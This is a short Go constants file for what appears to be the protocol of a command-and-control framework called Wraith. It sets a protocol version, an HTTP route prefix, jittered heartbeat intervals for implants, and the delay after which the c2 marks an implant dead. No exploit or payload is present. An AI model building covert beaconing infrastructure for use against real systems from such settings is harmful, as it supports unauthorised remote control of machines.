package proto

import "time"

const (
	// The version of the wraith-module-pinecomms protocol supported by the current
	// version of the module. This is updated whenever a breaking change is made to
	// the protocol.
	//
	// https://web.archive.org/web/20220618041607/https://www.ssa.gov/oact/babynames/decades/century.html
	CURRENT_PROTO = "james"

	// The prefix for all Wraith PineComms HTTP routes.
	ROUTE_PREFIX = "/_wpc/" + CURRENT_PROTO + "/"

	// Minimum time between heartbeat requests from Wraiths.
	HEARTBEAT_INTERVAL_MIN = time.Second * 20

	// Maximum time between heartbeat requests from Wraiths.
	HEARTBEAT_INTERVAL_MAX = time.Second * 40

	// The time after which a Wraith is marked as offline by the c2.
	HEARTBEAT_MARK_DEAD_DELAY = HEARTBEAT_INTERVAL_MAX*2 + 1*time.Second
)
